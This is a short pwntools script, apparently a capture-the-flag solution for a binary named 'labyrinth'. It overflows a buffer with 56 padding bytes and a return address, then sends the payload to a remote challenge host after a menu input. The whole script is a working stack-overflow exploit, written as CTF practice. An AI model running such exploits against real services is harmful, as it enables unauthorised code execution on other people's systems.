from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

offset = 56
#rbp = p64(0x7fffffffe1d0)
#rbp = p64(0x7ffff7d91010)
addr = p64(0x401256)
payload = offset*'A'+addr

ip,port = '64.227.41.83',30847
io = remote(ip,port)
#io = process('./labyrinth')
#io = gdb.debug('./labyrinth', 'break escape_plan')

io.recvuntil('>>')
io.sendline('69')
io.recvuntil('>>')
io.sendline(payload)
print io.recvall()
